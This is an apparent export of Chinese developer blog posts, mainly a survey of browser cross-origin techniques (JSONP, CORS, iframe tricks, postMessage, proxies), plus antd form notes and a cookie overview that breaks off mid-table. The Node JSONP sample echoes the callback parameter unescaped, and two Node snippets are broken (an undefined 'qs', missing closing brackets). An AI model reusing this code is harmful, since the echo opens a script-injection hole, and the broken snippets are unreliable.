[{"title":"前端跨域知识汇总","url":"%2F%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB%2F","content":"\n# 概述\n\n作为 web 开发，跨域是一个绕不开的话题，最早我们从使用 jQuery 的`jsonp`开始，到后来原生实现 jsonp，再到后来各种其他实现方式，如`document.domain+iframe`、`CORS`等，再到后来了解了可以通过 nginx 等代理跨域，现在随着 HTML5 的流行，又有了 postMessage 跨域与 WebSocket 协议跨域。对于相关概念、各种实现的区别本文做个汇总整理。\n\n<!-- more -->\n\n# 详述\n\n## 跨域\n\n跨域是指一个域下的文档或脚本试图去请求另一个域下的资源，这里跨域是广义的。\n\n广义的跨域：\n\n1. 资源跳转： A 链接、重定向、表单提交；\n2. 资源嵌入： `<link>`、`<script>`、`<img>`、`<frame>`等 dom 标签，还有样式中 background:url()、@font-face()等文件外链；\n3. 脚本请求： js 发起的 ajax 请求、dom 和 js 对象的跨域操作等；\n\n狭义的跨域：\n是由浏览器同源策略限制的一类请求场景。\n\n### 同源策略\n\n同源策略是一个重要的安全策略，它用于限制一个 origin 的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。\n\n同源策略/SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSFR 等攻击。所谓同源是指\"协议+域名+端口\"三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。\n\n同源策略限制以下几种行为：\n\n1. Cookie、LocalStorage 和 IndexDB 无法读取\n2. DOM 和 Js 对象无法获得\n3. AJAX 请求不能发送\n\n下表给出了与 URL `http://store.company.com/dir/page.html` 的源进行对比的示例:\n| URL | 结果 | 原因 |\n| :--- | :--- | :--- |\n| `http://store.company.com/dir2/other.html` | 同源 | 只有路径不同 |\n| `http://store.company.com/dir/inner/another.html` | 同源 | 只有路径不同 |\n| `https://store.company.com/secure.html` | 失败 | 协议不同 |\n| `http://store.company.com:81/dir/etc.html` | 失败 | 端口不同 ( http:// 默认端口是 80) |\n| `http://news.company.com/dir/other.html` | 失败 | 主机不同 |\n\n#### 源的继承\n\n在页面中通过 about:blank 或 javascript: URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。\n例如，about:blank 通常作为父脚本写入内容的新的空白弹出窗口的 URL（例如，通过 Window.open() ）。 如果此弹出窗口也包含 JavaScript，则该脚本将从创建它的脚本那里继承对应的源。\n\n#### IE 中的特例\n\nInternet Explorer 的同源策略有两个主要的差异点：\n\n- 授信范围（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），则不受同源策略限制。\n- 端口：IE 未将端口号纳入到同源策略的检查中，因此 `https://company.com:81/index.html` 和 `https://company.com/index.html` 属于同源并且不受任何限制。\n\n这些差异点是不规范的，其它浏览器也未做出支持。\n\n### 跨域解决方案\n\n#### jsonp 跨域\n\nJsonp(JSON with Padding) 是 json 的一种\"使用模式\"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。\n\n实现原理：基于两个条件：网页允许资源嵌入，且资源路径不受限制；网页使用 js 有三种方式，HTML 标签上`javascript:xxx`、`<script>`标签内和`<script>`标签外链。JSONP 就是利用这种标签外链，通过请求其他域下的服务，返回一个携带结果数据的 JS 执行函数。\n\njsonp 缺点：只能实现 get 一种请求。\n\n客户端定义一个函数：\n\n```js\nfunction handleCallback(res) {\n  alert(JSON.stringify(res));\n}\n```\n\n服务端返回一段 js：\n\n```js\nhandleCallback({ status: true, user: \"admin\" });\n```\n\n##### 具体实现\n\n客户端(原生)：\n\n```html\n<script>\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n\n  // 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数\n  script.src =\n    \"http://www.domain2.com:8080/login?user=admin&callback=handleCallback\";\n  document.head.appendChild(script);\n\n  // 回调执行函数\n  function handleCallback(res) {\n    alert(JSON.stringify(res));\n  }\n</script>\n```\n\n客户端(jquery):\n\n```js\n$.ajax({\n  url: \"http://www.domain2.com:8080/login\",\n  type: \"get\",\n  dataType: \"jsonp\", // 请求方式为jsonp\n  jsonpCallback: \"handleCallback\", // 自定义回调函数名\n  data: {},\n});\n```\n\n服务端（nodejs）：\n\n```js\nvar querystring = require(\"querystring\");\nvar http = require(\"http\");\nvar server = http.createServer();\n\nserver.on(\"request\", function (req, res) {\n  var params = qs.parse(req.url.split(\"?\")[1]);\n  var fn = params.callback;\n\n  // jsonp返回设置\n  res.writeHead(200, { \"Content-Type\": \"text/javascript\" });\n  res.write(fn + \"(\" + JSON.stringify(params) + \")\");\n\n  res.end();\n});\n\nserver.listen(\"8080\");\nconsole.log(\"Server is running at port 8080...\");\n```\n\n服务端（java）：\n\n```java\n    protected void packNoJsonStringCallBack(HttpServletRequest request, HttpServletResponse response, Object result) {\n        String jsoncallback = EscapeTool.escapeSpecialCharacters(request.getParameter(\"jsoncallback\"));\n        try {\n            response.setContentType(\"application/json; charset=utf-8\");\n            response.getWriter().write(jsoncallback + \"(\" + JSONObject.toJSON(result) + \")\");\n        }\n        catch (Exception e) {\n            log.error(\"SafetyMobileController::packJsonCallBack::\", e);\n        }\n    }\n```\n\n实际运用（JSONP+Promise）:\n\n```js\nconst jsonp = (url, params) => {\n  return new Promise((resolve, reject) => {\n    // 初始化url\n    let dataString = url.indexOf(\"?\") === -1 ? \"?\" : \"&\";\n    let callback = `jsonpCB_${Math.random().toString().substr(2)}`;\n    url += `${dataString}jsoncallback=${callback}`;\n    if (params) {\n      // 有请求参数，依次添加到url\n      if (typeof params === \"string\") url += \"&\" + params;\n      else if (typeof params === \"object\") {\n        for (let key in params) {\n          url += \"&\" + key + \"=\" + encodeURIComponent(params[key]);\n        }\n      }\n    }\n\n    const jsNode = document.createElement(\"script\");\n    jsNode.setAttribute(\"type\", \"text/javascript\");\n    jsNode.src = url;\n\n    const headEle = document.getElementsByTagName(\"head\")[0];\n\n    window[callback] = (response) => {\n      if (typeof response === \"string\") {\n        try {\n          response = JSON.parse(response);\n        } catch (error) {\n          reject(error);\n        }\n      }\n      headEle.removeChild(jsNode);\n      delete window[callback];\n\n      if (response) {\n        resolve(response);\n      } else {\n        reject(\"No Data\");\n      }\n    };\n\n    // js加载异常的情况\n    jsNode.addEventListener(\n      \"error\",\n      () => {\n        delete window[callback];\n        headEle.removeChild(jsNode);\n\n        reject(\"Load Error\");\n      },\n      false\n    );\n\n    headEle.appendChild(jsNode);\n  });\n};\n\nconst _jsonp = (url, params) => {\n  return new Promise((resolve, reject) => {\n    jsonp(url, params).then((response) => {\n      if (typeof response === \"string\") {\n        response = JSON.parse(response);\n      }\n      let { code, msg, token, data } = response;\n\n      if (code !== \"10001\") {\n        message.error(data && data.message);\n        reject(data && data.message);\n      }\n\n      resolve(data);\n    });\n  });\n};\n```\n\n#### 跨域资源共享（CORS）\n\n普通跨域请求：只服务端设置 Access-Control-Allow-Origin 即可，前端无须设置，若要带 cookie 请求：前后端都需要设置。\n\n需注意的是：由于同源策略的限制，所读取的 cookie 为跨域请求接口所在域的 cookie，而非当前页。\n\n目前，所有浏览器都支持该功能(IE8+：IE8/9 需要使用 XDomainRequest 对象来支持 CORS）)，CORS 也已经成为主流的跨域解决方案。\n\n前端设置：\n\n1. 原生 ajax\n\n```js\n// 前端设置是否带cookie\nxhr.withCredentials = true;\n```\n\n2. jQuery ajax\n\n```js\n$.ajax({\n    ...\n   xhrFields: {\n       withCredentials: true    // 前端设置是否带cookie\n   },\n   crossDomain: true,   // 会让请求头中包含跨域的额外信息，但不会含cookie\n    ...\n});\n```\n\n3. axios\n\n```js\naxios.defaults.withCredentials = true;\n```\n\n服务端设置：\n\n1. Java\n\n```java\n/*\n * 导入包：import javax.servlet.http.HttpServletResponse;\n * 接口参数中定义：HttpServletResponse response\n */\n\n// 允许跨域访问的域名：若有端口需写全（协议+域名+端口），若没有端口末尾不用加'/'\nresponse.setHeader(\"Access-Control-Allow-Origin\", \"http://www.domain1.com\");\n\n// 允许前端带认证cookie：启用此项后，上面的域名不能为'*'，必须指定具体的域名，否则浏览器会提示\nresponse.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n\n// 提示OPTIONS预检时，后端需要设置的两个常用自定义头\nresponse.setHeader(\"Access-Control-Allow-Headers\", \"Content-Type,X-Requested-With\");\n```\n\n2. Nodejs\n\n```js\nvar http = require(\"http\");\nvar server = http.createServer();\nvar qs = require(\"querystring\");\n\nserver.on(\"request\", function (req, res) {\n  var postData = \"\";\n\n  // 数据块接收中\n  req.addListener(\"data\", function (chunk) {\n    postData += chunk;\n  });\n\n  // 数据接收完毕\n  req.addListener(\"end\", function () {\n    postData = qs.parse(postData);\n\n    // 跨域后台设置\n    res.writeHead(200, {\n      \"Access-Control-Allow-Credentials\": \"true\", // 后端允许发送Cookie\n      \"Access-Control-Allow-Origin\": \"http://www.domain1.com\", // 允许访问的域（协议+域名+端口）\n      /*\n       * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)，\n       * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问\n       */\n      \"Set-Cookie\": \"l=a123456;Path=/;Domain=www.domain2.com;HttpOnly\", // HttpOnly的作用是让js无法读取cookie\n    });\n\n    res.write(JSON.stringify(postData));\n    res.end();\n  });\n});\n\nserver.listen(\"8080\");\nconsole.log(\"Server is running at port 8080...\");\n```\n\n实际运用：\n\n```java\n@RequestMapping(value = \"/promotion/hotDeals\", produces = \"text/html;charset=UTF-8\")\n@ResponseBody\npublic String hotDeals(@RequestParam(value = \"word\", required = true) String word,\n                        @RequestParam(value = \"pid\", required = true) String pid,\n                        @RequestParam(value = \"pageType\", required = true) String pageType,\n                        @RequestParam(value = \"pageNo\", required = true) String pageNo, HttpServletRequest request,\n                        HttpServletResponse response) {\n    // 支持跨域\n    response.addHeader(\"Access-Control-Allow-Origin\", \"*\");\n    AjaxSubmitResult result = AjaxSubmitResult.instance(AjaxSubmitResult.ASYNC_ERROR, null);\n\n    List<SpecialSkuDetailVo> skuList = getMatchedSpecialSku(word);\n    if (CollectionUtils.isNotEmpty(skuList)) {\n        result.setData(skuList);\n        recordExposureLog(PfSepcialConstant.SPECIAL_TYPE_FIGHTING, pid, word, pageType, pageNo, skuList);\n    }\n    result.setCode(AjaxSubmitResult.ASYNC_SUCCESS);\n    return EscapeTool.escapeSpecialCharacters(request.getParameter(\"callback\")) + \"(\"\n            + JSONObject.toJSONString(result) + \")\";\n}\n```\n\n#### `document.domain` + `iframe`跨域\n\n此方案仅限主域相同，子域不同的跨域应用场景。\n\n实现原理：两个页面都通过 js 强制设置 document.domain 为基础主域，就实现了同域。\n\n1. 父窗口：(`http://www.domain.com/a.html`)\n\n```html\n<iframe id=\"iframe\" src=\"http://child.domain.com/b.html\"></iframe>\n<script>\n  document.domain = \"domain.com\";\n  var user = \"admin\";\n</script>\n```\n\n2. 子窗口：(`http://child.domain.com/b.html`)\n\n```html\n<script>\n  document.domain = \"domain.com\";\n  // 获取父窗口中变量\n  alert(\"get js data from parent ---> \" + window.parent.user);\n</script>\n```\n\n实际运用：\n在主站（主站应用 www.abc.com）中打开弹框登录窗口（登录应用 login.abc.com），这时候两个子域之间沟通可以通过设置 domain 为父域值来实现数据交换。\n\n#### `location.hash` + `iframe`跨域\n\n实现原理： a 欲与 b 跨域相互通信，通过中间页 c 来实现。 三个页面，不同域之间利用 iframe 的 location.hash 传值，相同域之间直接 js 访问来通信。\n\n具体实现：A 域：a.html -> B 域：b.html -> A 域：c.html，a 与 b 不同域只能通过 hash 值单向通信，b 与 c 也不同域也只能单向通信，但 c 与 a 同域，所以 c 可通过 parent.parent 访问 a 页面所有对象。\n\n1. a.html：(`http://www.domain1.com/a.html`)\n\n```html\n<iframe\n  id=\"iframe\"\n  src=\"http://www.domain2.com/b.html\"\n  style=\"display:none;\"\n></iframe>\n<script>\n  var iframe = document.getElementById(\"iframe\");\n\n  // 向b.html传hash值\n  setTimeout(function () {\n    iframe.src = iframe.src + \"#user=admin\";\n  }, 1000);\n\n  // 开放给同域c.html的回调方法\n  function onCallback(res) {\n    alert(\"data from c.html ---> \" + res);\n  }\n</script>\n```\n\n2. b.html：(`http://www.domain2.com/b.html`)\n\n```html\n<iframe\n  id=\"iframe\"\n  src=\"http://www.domain1.com/c.html\"\n  style=\"display:none;\"\n></iframe>\n<script>\n  var iframe = document.getElementById(\"iframe\");\n\n  // 监听a.html传来的hash值，再传给c.html\n  window.onhashchange = function () {\n    iframe.src = iframe.src + location.hash;\n  };\n</script>\n```\n\n3. c.html：(`http://www.domain1.com/c.html`)\n\n```html\n<script>\n  // 监听b.html传来的hash值\n  window.onhashchange = function () {\n    // 再通过操作同域a.html的js回调，将结果传回\n    window.parent.parent.onCallback(\n      \"hello: \" + location.hash.replace(\"#user=\", \"\")\n    );\n  };\n</script>\n```\n\n#### `window.name` + `iframe`跨域\n\nwindow.name 属性的独特之处：name 值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。\n\n1. a.html：(`http://www.domain1.com/a.html`)\n\n```js\nvar proxy = function (url, callback) {\n  var state = 0;\n  var iframe = document.createElement(\"iframe\");\n\n  // 加载跨域页面\n  iframe.src = url;\n\n  // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name\n  iframe.onload = function () {\n    if (state === 1) {\n      // 第2次onload(同域proxy页)成功后，读取同域window.name中数据\n      callback(iframe.contentWindow.name);\n      destoryFrame();\n    } else if (state === 0) {\n      // 第1次onload(跨域页)成功后，切换到同域代理页面\n      iframe.contentWindow.location = \"http://www.domain1.com/proxy.html\";\n      state = 1;\n    }\n  };\n\n  document.body.appendChild(iframe);\n\n  // 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）\n  function destoryFrame() {\n    iframe.contentWindow.document.write(\"\");\n    iframe.contentWindow.close();\n    document.body.removeChild(iframe);\n  }\n};\n\n// 请求跨域b页面数据\nproxy(\"http://www.domain2.com/b.html\", function (data) {\n  alert(data);\n});\n```\n\n2. proxy.html：(`http://www.domain1.com/proxy.html`)\n   中间代理页，与 a.html 同域，内容为空即可。\n\n3. b.html：(`http://www.domain2.com/b.html`)\n\n```html\n<script>\n  window.name = \"This is domain2 data!\";\n</script>\n```\n\n总结：通过 iframe 的 src 属性由外域转向本地域，跨域数据即由 iframe 的 window.name 从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n#### postMessage 跨域\n\npostMessage 是 HTML5 XMLHttpRequest Level 2 中的 API，且是为数不多可以跨域操作的 window 属性之一，它可用于解决以下方面的问题：\n\n1. 页面和其打开的新窗口的数据传递\n2. 多窗口之间消息传递\n3. 页面与嵌套的 iframe 消息传递\n4. 上面三个场景的跨域数据传递\n\n用法：postMessage(data,origin)方法接受两个参数\ndata： html5 规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用 JSON.stringify()序列化。\norigin： 协议+主机+端口号，也可以设置为\"\\*\"，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为\"/\"。\n\n1. a.html：(`http://www.domain1.com/a.html`)\n\n```html\n<iframe\n  id=\"iframe\"\n  src=\"http://www.domain2.com/b.html\"\n  style=\"display:none;\"\n></iframe>\n<script>\n  var iframe = document.getElementById(\"iframe\");\n  iframe.onload = function () {\n    var data = {\n      name: \"aym\",\n    };\n    // 向domain2传送跨域数据\n    iframe.contentWindow.postMessage(\n      JSON.stringify(data),\n      \"http://www.domain2.com\"\n    );\n  };\n\n  // 接受domain2返回数据\n  window.addEventListener(\n    \"message\",\n    function (e) {\n      alert(\"data from domain2 ---> \" + e.data);\n    },\n    false\n  );\n</script>\n```\n\n2. b.html：(`http://www.domain2.com/b.html`)\n\n```html\n<script>\n  // 接收domain1的数据\n  window.addEventListener(\n    \"message\",\n    function (e) {\n      alert(\"data from domain1 ---> \" + e.data);\n\n      var data = JSON.parse(e.data);\n      if (data) {\n        data.number = 16;\n\n        // 处理后再发回domain1\n        window.parent.postMessage(\n          JSON.stringify(data),\n          \"http://www.domain1.com\"\n        );\n      }\n    },\n    false\n  );\n</script>\n```\n\n实际运用：\n\n域 1 下的 react 项目中：\n\n```js\n\n  componentDidMount() {\n    this.getDetailUrl();\n    window.addEventListener(\"message\", this.receiveMessage, false);\n\n  }\n  ...\n\n  // 向iframe发送数据\n  sendPostMessage(data, name) {\n    //必须是iframe加载完成后才可以向子域发送数据\n    const childFrameObj = document.getElementById('Model');\n    childFrameObj.contentWindow.postMessage({data, name}, this.state.postMesUrl);\n  };\n\n  ...\n\n  receiveMessage = (event) => {\n\n    if (event !== undefined && event.data && event.data.name) {\n\n      var eventData = event.data;\n\n      ...\n\n    }\n\n  };\n```\n\n域 2 下的 jquery 项目中：\n\n```js\nvar evt = window.event;\nvar postMessageUrl = \"https://xxx.xxx.com\";\n\n//监听message事件 接收react传过来的参数\nwindow.addEventListener(\"message\", receiveMessageFromReact, false);\n\n//向react发送数据\nfunction transmitData(data) {\n  parent.postMessage(data, postMessageUrl); //window.postMessage\n}\n\n/*search*/\nvar searchResult = function () {\n  var initData = {\n    name: \"search\",\n    data: {\n      keyword: $(\"input[name=keyword]\").val(),\n    },\n  };\n  transmitData(initData);\n};\n$(\".J-search-btn\").click(function (e) {\n  e.preventDefault();\n  searchResult();\n});\n$(\"input[name=keyword]\").on(\"keyup\", function (e) {\n  if (e.keyCode === 13) {\n    searchResult();\n  }\n});\n```\n\n#### WebSocket 协议跨域\n\nWebSocket protocol 是 HTML5 一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是 server push 技术的一种很好的实现。\n原生 WebSocket API 使用起来不太方便，我们使用 Socket.io，它很好地封装了 webSocket 接口，提供了更简单、灵活的接口，也对不支持 webSocket 的浏览器提供了向下兼容。\n\n1. 前端代码：\n\n```html\n<div>user input：<input type=\"text\" /></div>\n<script src=\"https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js\"></script>\n<script>\n  var socket = io(\"http://www.domain2.com:8080\");\n\n  // 连接成功处理\n  socket.on(\"connect\", function () {\n    // 监听服务端消息\n    socket.on(\"message\", function (msg) {\n      console.log(\"data from server: ---> \" + msg);\n    });\n\n    // 监听服务端关闭\n    socket.on(\"disconnect\", function () {\n      console.log(\"Server socket has closed.\");\n    });\n  });\n\n  document.getElementsByTagName(\"input\")[0].onblur = function () {\n    socket.send(this.value);\n  };\n</script>\n```\n\n2. Nodejs socket 后台：\n\n```js\nvar http = require('http');\nvar socket = require('socket.io');\n\n// 启http服务\nvar server = http.createServer(function(req, res) {\n    res.writeHead(200, {\n        'Content-type': 'text/html'\n    });\n    res.end();\n});\n\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n\n// 监听socket连接\nsocket.listen(server).on('connection', function(client) {\n    // 接收信息\n    client.on('message', function(msg) {\n        client.send('hello：' + msg);\n        console.log('data from client: ---> ' + msg);\n    });\n\n    // 断开处理\n    client.on('disconnect', function() {\n        console.log('Client socket has closed.');\n    });\n```\n\n#### nginx 代理跨域\n\n1. nginx 配置解决 iconfont 跨域\n\n浏览器跨域访问 js、css、img 等常规静态资源被同源策略许可，但 iconfont 字体文件(eot|otf|ttf|woff|svg)例外，此时可在 nginx 的静态资源服务器中加入以下配置。\n\n```xml\nlocation / {\n  add_header Access-Control-Allow-Origin *;\n}\n```\n\n2. nginx 反向代理接口跨域\n\n跨域原理： 同源策略是浏览器的安全策略，不是 HTTP 协议的一部分。服务器端调用 HTTP 接口只是使用 HTTP 协议，不会执行 JS 脚本，不需要同源策略，也就不存在跨越问题。\n\n实现思路：通过 nginx 配置一个代理服务器（域名与 domain1 相同，端口不同）做跳板机，反向代理访问 domain2 接口，并且可以顺便修改 cookie 中 domain 信息，方便当前域 cookie 写入，实现跨域登录。\n\nnginx 具体配置：\n\n```xml\n#proxy服务器\nserver {\n    listen       81;\n    server_name  www.domain1.com;\n\n    location / {\n        proxy_pass   http://www.domain2.com:8080;  #反向代理\n        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名\n        index  index.html index.htm;\n\n        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用\n        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*\n        add_header Access-Control-Allow-Credentials true;\n    }\n}\n```\n\n前端代码示例：\n\n```js\nvar xhr = new XMLHttpRequest();\n\n// 前端开关：浏览器是否读写cookie\nxhr.withCredentials = true;\n\n// 访问nginx中的代理服务器\nxhr.open(\"get\", \"http://www.domain1.com:81/?user=admin\", true);\nxhr.send();\n```\n\nNodejs 后台示例：\n\n```js\nvar http = require(\"http\");\nvar server = http.createServer();\nvar qs = require(\"querystring\");\n\nserver.on(\"request\", function (req, res) {\n  var params = qs.parse(req.url.substring(2));\n\n  // 向前台写cookie\n  res.writeHead(200, {\n    \"Set-Cookie\": \"l=a123456;Path=/;Domain=www.domain2.com;HttpOnly\", // HttpOnly:脚本无法读取\n  });\n\n  res.write(JSON.stringify(params));\n  res.end();\n});\n\nserver.listen(\"8080\");\nconsole.log(\"Server is running at port 8080...\");\n```\n\n#### Nodejs 中间件代理跨域\n\nnode 中间件实现跨域代理，原理大致与 nginx 相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置 cookieDomainRewrite 参数修改响应头中 cookie 中域名，实现当前域的 cookie 写入，方便接口登录认证。\n\n利用 node + express + http-proxy-middleware 搭建一个 proxy 服务器。\n\n前端代码示例：\n\n```js\nvar xhr = new XMLHttpRequest();\n\n// 前端开关：浏览器是否读写cookie\nxhr.withCredentials = true;\n\n// 访问http-proxy-middleware代理服务器\nxhr.open(\"get\", \"http://www.domain1.com:3000/login?user=admin\", true);\nxhr.send();\n```\n\n中间件服务器：\n\n```js\nvar express = require(\"express\");\nvar proxy = require(\"http-proxy-middleware\");\nvar app = express();\n\napp.use(\n  \"/\",\n  proxy({\n    // 代理跨域目标接口\n    target: \"http://www.domain2.com:8080\",\n    changeOrigin: true,\n\n    // 修改响应头信息，实现跨域并允许带cookie\n    onProxyRes: function (proxyRes, req, res) {\n      res.header(\"Access-Control-Allow-Origin\", \"http://www.domain1.com\");\n      res.header(\"Access-Control-Allow-Credentials\", \"true\");\n    },\n\n    // 修改响应信息中的cookie域名\n    cookieDomainRewrite: \"www.domain1.com\", // 可以为false，表示不修改\n  })\n);\n\napp.listen(3000);\nconsole.log(\"Proxy server is listen at port 3000...\");\n```\n\nNodejs 后台（同 nginx）\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy\n\nhttps://segmentfault.com/a/1190000011145364\n","tags":["HTML"],"categories":["其他"]},{"title":"备忘目录","url":"%2F%E5%A4%87%E5%BF%98%E7%9B%AE%E5%BD%95%2F","content":"\n# 概述\n\n<!-- more -->\n\n# 详述\n1. [换了电脑或者重装了系统后如何重新和github仓库建立连接](https://www.jianshu.com/p/a0a00965bac9)\n# 参考\n","tags":["HTML"],"categories":["其他"]},{"title":"antd 3.x实战小结","url":"%2Fantd-3-1%2F","content":"\n# 概述\nantd(v3.26.3)实战中的一些注意点做个小结。\n<!-- more -->\n\n# 详述\n## Input\nInput的onChange绑定函数参数是e，想获取值用`e.target.value`。\n## Select\nSelect的onChange绑定函数参数是value，想获取值直接用value，想获取其他值例如显示的文本等，可以通过第二个参数option获取。\n\n一个典型的场景就是Select最终提交的值是选项的id，回显需要的是option的文本内容，这时就可以：\n```js\n  handleChangeProvince(provinceId, option) {\n    ...\n\n    this.props.form.setFieldsValue({\n      provinceName: option.props.children\n    });\n\n    ...\n  }\n```\n![断点option值](1.jpg)\n## defaultValue与value的区别\n\ndefaultValue与value的区别是都可以实现初始值，但是加value属性后变成完全受控组件，defaultValue不是。\n\n### Modal弹框表单提交\n\n想通过Modal弹框的Confirm按钮触发提交需要通过ref来获取form实例：\n```js\n// Hook创建一个ref实例\nconst addressFormRef = useRef(null);\n// 弹框确认处理函数\nconst handleOkAddressForm = () => {\n  // validateFieldsAndScroll是Form.creat包装的form组件示例方法\n  addressFormRef.current.validateFieldsAndScroll((err, values) => {\n    if (!err) {\n      // console.log('Received values of form: ', values)\n    }\n  });\n};\n// 设置ref属性\n<Modal\n  destroyOnClose={true}\n  title={\"Add Address\"}\n  okText=\"Confirm\"\n  visible={addressVisible}\n  width={MODALWIDTH}\n  confirmLoading={confirmLoading}\n  onCancel={() => setAddressVisible(false)}\n  onOk={handleOkAddressForm}\n>\n  <WrappedAddressForm ref={addressFormRef} />\n</Modal>\n```\n\n## Form.create包装的组件校验\n综合示例：\n```js\n<Form.Item label=\"Zip Code\" required={zipCodeRequied}>\n  {getFieldDecorator(\"zip\", {\n    initialValue: address.zip,\n    rules: [\n      {\n        required: true,\n        message: \"Please enter zip code.\"\n      },\n      {\n        validator: (rule, value, callback)=>{\n          ...\n          callback()\n        }\n      },\n      {\n        isUS: encryptedSelectedCountryId === ENCRYPTREGIONID.US,\n        validator: method.zipCode()\n      },\n      {             \n        validator: (rule, value, callback) => {\n          // 异步校验\n          let formData = this.props.form.getFieldsValue(['countryId','provinceId','zip'])\n          shoppingCartApi.zipValid(formData).then(response => {\n            if (response.status === \"1\") {\n              callback();\n            } else {\n              callback(response.message || \"Please enter a valid zip code.\");\n            }\n          });\n\n        }\n      }\n    ]\n  })(\n    <Input maxLength={20} onBlur={this.handleBlur.bind(this, \"zip\")} />\n  )}\n</Form.Item>\n```\n### 自定义校验方法\n校验规则除了关键字如`required`，还可以通过`validator`自定义校验（注意，callback 必须被调用）。在实际生产中，通常会把校验方法放到一个地方集中维护，这时候就涉及把表单页面中的参数传递到校验方法中。官网没有明确给出示例，网上很多文章也没有，其实思路也很清楚，肯定在第一个参数`rule`上，但是看了官网介绍也没明白rule到底咋用。经过一番断点测试才理顺，原来这个rule就是rules里的一个对象`{}`，因此在这里定义的任何键值对都可以通过rule取到。\n```js\n  zipCode: msg => {\n    return (rule, value, callback) => {\n      if (\n        value &&\n        rule.isUS &&\n        !/^(\\d{5}(?:\\-?\\d{4})?)$/.test(value)\n      ) {\n        callback(\n          msg ||\n            'Must be a 5 or 9 digit number, e.g.00000、000000000、00000-0000.'\n        );\n      } else {\n        callback();\n      }\n    };\n  }\n```\n![断点rule](2.jpg)\n\n### 手动触发某个表单项校验\n这个也常见，实际场景就是表单项联动，例如国家、省（州）、邮编，重新选择不同的国家、省（州）需要重新校验邮编。\n```js\nhandleChangeProvince(provinceId, option) {\n  ...\n  this.props.form.validateFields(['zip']);\n  ...\n}\n```\n### 异步校验\n这个就是自定义校验的一种形式，见上面的综合示例。\n\n更多高级用法可研究 [async-validator](https://github.com/yiminghe/async-validator)。\n\n## Form表单的自定义校验\n官网有直接示例，主要是通过`validateStatus`、`help`、`hasFeedback` 等属性，你可以不需要使用 Form.create 和 getFieldDecorator，自己定义校验的时机和内容。\n\n- validateStatus: 校验状态，可选 'success', 'warning', 'error', 'validating'。\n- hasFeedback：用于给输入框添加反馈图标。\n- help：设置校验文案。\n   \n```js\n<Form.Item\n  label=\"Fail\"\n  validateStatus=\"error\"\n  help=\"Should be combination of numbers & alphabets\"\n>\n  <Input placeholder=\"unavailable choice\" id=\"error\" />\n</Form.Item>\n```\n# 参考\nhttps://3x.ant.design/components/form-cn/#components-form-demo-global-state","tags":["React"],"categories":["框架与库"]},{"title":"Cookie、Session、Token、JWT信息摘要","url":"%2FCookie-Session-Token-JWT%2F","content":"\n# 概述\n本文是关于认证授权方法的讲解，摘录自一篇网络博文，主要讲了Cookie、Session、Token、JWT的概念、异同、使用场景和实现方式。\n<!-- more -->\n\n# 详述\n\n## Cookie\nHTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息）：每个请求都是完全独立的，服务端无法确认当前访问者的身份信息，无法分辨上一次的请求发送者和这一次的发送者是不是同一个人。所以服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。\ncookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。\ncookie 是不可跨域的： 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，一级域名和二级域名之间是允许共享使用的（靠的是 domain）。\n\n### cookie 重要的属性\n\n|    属性    | 说明                                                                                                                                                                                                                              |\n| :--------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| name=value | 键值对，设置 Cookie 的名称及相对应的值，都必须是字符串类型- 如果值为 Unicode 字符，需要为字符编码。- 如果值为二进制数据，则需要使用 BASE64 编码。                                                                                 |\n|   domain   | 指定 cookie 所属域名，默认是当前域名                                                                                                                                                                                              |\n|    path    | 指定 cookie 在哪个路径（路由）下生效，默认是 '/'。如果设置为 /abc，则只有 /abc 下的路由可以访问到该 cookie，如：/abc/read。                                                                                                       |\n|   maxAge   | cookie 失效的时间，单位秒。如果为整数，则该 cookie 在 maxAge 秒后失效。如果为负数，该 cookie 为临时 cookie ，关闭浏览器即失效，浏览器也不会以任何形式保存该 cookie 。如果为 0，表示删除该 cookie 。默认为 -1。- 比 expires 好用。 |\n|  expires   | 过期时间，在设置的某个时间点后该 cookie 就会失效。一般浏览器的 cookie 都是默认储存的，当关闭浏览器结束这个会话的时候，这个 cookie 也就会被删除                                                                                    |\n|   secure   | 该 cookie 